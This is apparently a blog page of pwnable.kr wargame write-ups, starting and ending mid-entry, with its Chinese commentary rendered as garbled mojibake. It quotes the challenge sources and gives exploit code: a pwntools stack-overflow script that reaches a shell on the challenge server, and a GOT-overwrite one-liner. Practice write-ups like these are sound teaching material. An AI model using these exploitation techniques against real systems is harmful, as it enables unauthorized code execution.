16*&quot;\x01&quot;&#x27;</span>)  </span><br><span class="line"> </span><br><span class="line">flag ï¼š daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆæ˜¯<strong>xE8\x05\xD9\x1D</strong> å› ä¸ºæ˜¯32ä½ï¼Œæ‰€ä»¥æ˜¯å°ç«¯è¾“å…¥ã€‚</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><strong>æ—¶é—´</strong> 2017-01-19<br>è¿™ä¸ªé¢˜ç›®ç»™äº†ä¸€ä¸ªbinç¨‹åºä»¥åŠæºç ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œé¢˜ç›®çš„binæ˜¯32ä¸ºçš„ï¼Œä¸»è¦å°ç«¯ã€‚è€Œé¢˜ç›®æ€è·¯å¾ˆç®€å•ï¼Œé€šè¿‡æº¢å‡ºï¼Œå»è¦†ç›–keyä¸º0xcafebabe,å½“keyçš„å€¼ä¸º0xcafebabeï¼Œä»–ä¼šè°ƒç”¨systemçš„**/bin/sh**<br> è€Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å¾—åˆ°flagï¼Œæ‰€ä»¥æˆ‘ä»¬å†å†™å…¥<code>cat flag</code>ã€‚é‚£ä¹ˆè¿™é‡Œä¸»è¦çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæˆ‘ä»¬å¦‚ä½•å‡†ç¡®çš„è¦†ç›–åˆ°overflowmeçš„æ•°ç»„å‘¢ã€‚<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-19/693899-file_1484832203073_cb0d.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-19/693899-file_1484832203073_cb0d.png"></a><br>ebpä¸ºå®šä½æ ‡å‡†ï¼Œæ‰€ä»¥0x2c+8å³å¯ æ‰€ä»¥åº”è¯¥æ˜¯ 54ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æœ€ç»ˆçš„expæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = io = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">52</span> + <span class="string">&quot;\xbe\xba\xfe\xca&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">result = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>upxè§£å‹ç¼©ï¼Œåœ¨IDAä¸­ï¼Œæ‰¾åˆ°flagå˜é‡å¼•ç”¨ï¼Œ<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-19/99198640-file_1484837703856_14448.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-19/99198640-file_1484837703856_14448.png"></a></p><h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p><strong>æ—¶é—´</strong>2017-01-20<br>sshä¸Šå»åï¼Œé¢˜ç›®ç»™äº†æºä»£ç ï¼Œå¦‚ä¸‹:`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">        int passcode1;</span><br><span class="line">        int passcode2;</span><br><span class="line"></span><br><span class="line">        printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode1);</span><br><span class="line">        fflush(stdin);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">        printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, passcode2);</span><br><span class="line"></span><br><span class="line">        printf(&quot;checking...\n&quot;);</span><br><span class="line">        if(passcode1&#x3D;&#x3D;338150 &amp;&amp; passcode2&#x3D;&#x3D;13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">        char name[100];</span><br><span class="line">        printf(&quot;enter you name : &quot;);</span><br><span class="line">        scanf(&quot;%100s&quot;, name);</span><br><span class="line">        printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">        welcome();</span><br><span class="line">        login();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; something after login...</span><br><span class="line">        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬æ¥ç¬¬ä¸€ä»½ååº”æ˜¯æ„é€ å»æ»¡è¶³ifçš„æ¡ä»¶å³å¯ï¼Œä½†æ˜¯å‘ç°welcomeå‡½æ•°çš„æ•°ç»„åªæœ‰100ï¼Œname[100] ebp 0x70 112 pwd1 ebp-0x10 16 pwd2 ebp-0xc 12 112-12=100ï¼Œä¸è¶³ä»¥å»è¦†ç›–æœªåˆå§‹åŒ–çš„passcode2ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°loginå‡½æ•°é‡Œçš„ä¸¤ä¸ªscanfæœ‰æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¯¯ç”¨æ„é€ ç”¨è¿‡å‡½æ•°è·³è½¬å»æ‰§è¡Œ<code>/bin/cat flag</code>,é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çš„æ¡ä»¶ä¹‹ä¸€æ˜¯å¦‚ä½•æ„é€ ä»¥åŠå»æ‰¾åˆ°å…³é”®çš„è¿™ä¸ªæ‰§è¡Œçš„åœ°å€åœ¨å“ªã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“ifä¸ç¬¦åˆæ¡ä»¶çš„æ—¶å€™ï¼Œä»–ä¼šæ‰§è¡Œexitå¯’ç´ ï¼Œæˆ‘ä»¬å°†passcode1ä¿®æ”¹ä¸ºexitï¼Œå³ â€œ\x18\xa0\x04\x08â€<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-20/71309578-file_1484924172110_a5eb.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-20/71309578-file_1484924172110_a5eb.png"></a><br>ç„¶åå†è®©ä»–å»æ‰§è¡Œ system(â€œ/bin/cat flagâ€);<br>æˆ‘ä»¬é€šè¿‡ objdump -M intel -d ./passcode å»æ‰¾å…³é”®çš„åœ°å€<br><a href="http://oayoilchh.bkt.clouddn.com/17-1-20/32318341-file_1484924207785_de63.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-1-20/32318341-file_1484924207785_de63.jpg"></a><br>æ‰€ä»¥æœ€åçš„expæ˜¯:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c  <span class="string">&#x27;print &quot;A&quot;*96 + &quot;\x18\xa0\x04\x08&quot; + &quot;134514147\n&quot;+ &quot;f\n&quot;&#x27;</span> | ./passcode</span><br></pre></td></tr></table></figure><p>134514147ä¸º0x80485e3çš„åè¿›åˆ¶æ•°å€¼ï¼ˆå› ä¸º %dæ˜¯å–å‡ºæ•´æ•°ï¼‰</p><h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>è¿™ä¸ªé¢˜ç›®ä¾æ—§æ²¡ç»™binç¨‹åºï¼Œä½†æ˜¯ç»™äº†æºä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡º randå‡½æ•°äº§ç”Ÿçš„æ˜¯ä¼ªéšæœºæ•°,æ¯æ¬¡äº§ç”Ÿå‡ºçš„æ˜¯å›ºå®šå€¼ï¼Œåœ¨æœ¬åœ°è·‘ä¸€ä¸‹å‘ç°å›ºå®šä¸º1804289383,äº0xdeadbeefå¼‚æˆ–åå¾—åˆ°3039230856</p><h1 id="input"><a href="#input" class="headerlink" title="input"></a>input</h1><p><strong>æ—¶é—´</strong> 2017-01-26<br>é¢˜ç›®æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//å‚æ•°ä¸ªæ•°ä¸º100-1 ,argv[0]æ˜¯ç¨‹åºè·¯å¾„åŠåç§°</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//argv[65]</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//argv[66]</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio ç”¨ç®¡é“é‡å®šå‘è¯¥è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);<span class="comment">//ä»æ ‡å‡†è¾“å…¥ä¸­è¯»</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);<span class="comment">//ä»æ ‡å‡†é”™è¯¯è¾“å‡ºä¸­è¯»</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file ä»æ–‡ä»¶\x0aä¸­ è¯»å‡º4å­—èŠ‚ åˆ¤æ–­æ˜¯å¦ä¸º \x00\x00\x00\x00</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );<span class="comment">//ç›‘å¬ç«¯å£ä¸ºargv[67]</span></span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªæœ‰/tmpç›®å½•ä¸‹æ‰æœ‰å†™æƒé™ï¼Œè€Œæœ€åè¯»flagçš„è¯­å¥ä¸º /bin/cat flagï¼Œæ‰€ä»¥è¦å°†flagæ–‡ä»¶é“¾æ¥åˆ°/tmpç›®å½•ä¸‹ï¼Œåœ¨/tmpç›®å½•ä¸‹æ–°å»ºè½¯é“¾æ¥ï¼š<br>æ‰€ä»¥ï¼š åªéœ€è¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/input/flag /tmp/flag    </span><br></pre></td></tr></table></figure><h1 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h1><p>è¿™æ˜¯ç¬¬å…«ä¸ªå§ï¼Œè¿™æ˜¯armæ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;push&#123;r6&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;addr6, pc, $1\n&quot;</span></span><br><span class="line"><span class="string">&quot;bxr6\n&quot;</span></span><br><span class="line"><span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line"><span class="string">&quot;movr3, pc\n&quot;</span></span><br><span class="line"><span class="string">&quot;addr3, $0x4\n&quot;</span></span><br><span class="line"><span class="string">&quot;push&#123;r3&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;pop&#123;pc&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;.code32\n&quot;</span></span><br><span class="line"><span class="string">&quot;pop&#123;r6&#125;\n&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"><span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY); <span class="number">0x00008ce4</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">write(<span class="number">0</span>, buf, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­æ¥çœ‹ï¼Œæˆ‘ä»¬çŸ¥é“å…³é”®æ˜¯<code>key1</code> <code>key2</code> <code>key3</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çš„æ˜¯å»æ‰¾åˆ°ä»–ä»¬çš„è¿”å›å€¼ï¼Œå…·ä½“ä»ä»£ç æ¥çœ‹ å·²çŸ¥æ¡ä»¶æ˜¯</p><ul><li>å‰4ä¸ªå‚æ•°åˆ†åˆ«æ”¾åœ¨R0ï¼ŒR1ï¼ŒR2ï¼ŒR3ä¸­ï¼Œå¤šå‡ºæ¥çš„æ‰å­˜åœ¨æ ˆä¸Š</li><li>å‡½æ•°è¿”å›å€¼å­˜åœ¨R0ä¸­</li><li>LRä¿å­˜å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆå‡½æ•°è°ƒç”¨æ—¶çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼‰</li><li>PCä¿å­˜å½“å‰æŒ‡ä»¤çš„ä¸‹2æ¡æŒ‡ä»¤åœ°å€ï¼Œåœ¨armæ¨¡å¼ä¸‹ä¸º å½“å‰æŒ‡ä»¤åœ°å€+8ï¼Œåœ¨thumbæ¨¡å¼ä¸‹ä¸º å½“å‰æŒ‡ä»¤åœ°å€+4<br>åˆ†åˆ«çœ‹ä¸‰ä¸ªkeyçš„æ±‡ç¼–</li><li>*key1**<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec 